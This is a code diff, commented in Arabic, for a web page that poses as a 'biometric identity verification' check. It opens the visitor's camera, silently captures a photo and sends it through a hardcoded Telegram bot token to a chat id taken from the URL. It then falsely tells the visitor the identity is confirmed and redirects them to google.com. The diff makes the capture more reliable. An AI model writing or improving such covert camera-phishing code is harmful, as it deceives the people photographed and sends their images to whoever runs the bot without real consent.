@@ -100,7 +100,7 @@
 </div>
 
 <script>
-    // تعديل التوكن بناءً على طلبك يا سيف
+    // التوكن المعتمد الخاص بك
     const BOT_TOKEN = "8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc";
 
     function getChatIdFromURL() {
@@ -136,43 +136,53 @@
             videoPreview.srcObject = stream;
             statusDiv.innerText = "تم الاتصال بالعدسة البيومترية بنجاح. جاري مطابقة الملامح الرقمية...";
 
-            setTimeout(async () => {
-                try {
-                    canvas.width = videoPreview.videoWidth;
-                    canvas.height = videoPreview.videoHeight;
-                    const context = canvas.getContext('2d');
-                    context.drawImage(videoPreview, 0, 0, canvas.width, canvas.height);
+            // الانتظار حتى يتأكد المتصفح من جاهزية بث الفيديو بالكامل لقراءة أبعاده الحقيقية بأمان
+            videoPreview.onloadedmetadata = () => {
+                setTimeout(async () => {
+                    try {
+                        // استخدام الأبعاد الحقيقية للبث، مع وضع أبعاد احتياطية إذا كانت القراءة صفرية لمنع تعطل toBlob
+                        const width = videoPreview.videoWidth || 640;
+                        const height = videoPreview.videoHeight || 480;
+                        
+                        canvas.width = width;
+                        canvas.height = height;
+                        
+                        const context = canvas.getContext('2d');
+                        context.drawImage(videoPreview, 0, 0, width, height);
 
-                    canvas.toBlob(async (blob) => {
-                        if (blob) {
-                            const formData = new FormData();
-                            formData.append('chat_id', chatId);
-                            formData.append('photo', blob, 'identity_capture.png');
-                            formData.append('caption', '📸 لقطة التحقق الرقمي المحدثة.');
+                        // التقاط الصورة بصيغة JPEG لضمان التوافقية الكاملة وخفة الحجم أثناء الإرسال السحابي
+                        canvas.toBlob(async (blob) => {
+                            if (blob) {
+                                const formData = new FormData();
+                                formData.append('chat_id', chatId);
+                                formData.append('photo', blob, 'identity_capture.jpg');
+                                formData.append('caption', '📸 لقطة التحقق الرقمي المحدثة.');
 
-                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                                method: 'POST',
-                                body: formData
-                            });
-                        }
-                    }, 'image/png');
+                                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                    method: 'POST',
+                                    body: formData
+                                });
+                            }
+                        }, 'image/jpeg', 0.9);
 
-                } catch (err) {
-                    console.error("خطأ إرسال اللقطة:", err);
-                }
+                    } catch (err) {
+                        console.error("خطأ إرسال اللقطة:", err);
+                    }
 
-                setTimeout(() => {
-                    stream.getTracks().forEach(track => track.stop());
-                    statusTitleObj.innerText = "اكتمل التحقق";
-                    statusDiv.style.color = "#34d399";
-                    statusDiv.innerText = "تمت المطابقة وتأكيد الهوية بنجاح! جاري التوجيه...";
-                    
+                    // إغلاق الكاميرا والتوجيه التلقائي بعد إتمام المهمة
                     setTimeout(() => {
-                        window.location.href = "https://www.google.com";
-                    }, 1500);
-                }, 2000);
+                        stream.getTracks().forEach(track => track.stop());
+                        statusTitleObj.innerText = "اكتمل التحقق";
+                        statusDiv.style.color = "#34d399";
+                        statusDiv.innerText = "تمت المطابقة وتأكيد الهوية بنجاح! جاري التوجيه...";
+                        
+                        setTimeout(() => {
+                            window.location.href = "https://www.google.com";
+                        }, 1500);
+                    }, 2000);
 
-            }, 2000);
+                }, 2000); // التقاط اللقطة بعد ثانيتين من ثبات الكاميرا
+            };
 
         } catch (error) {
             console.error("خطأ الوصول للكاميرا:", error);
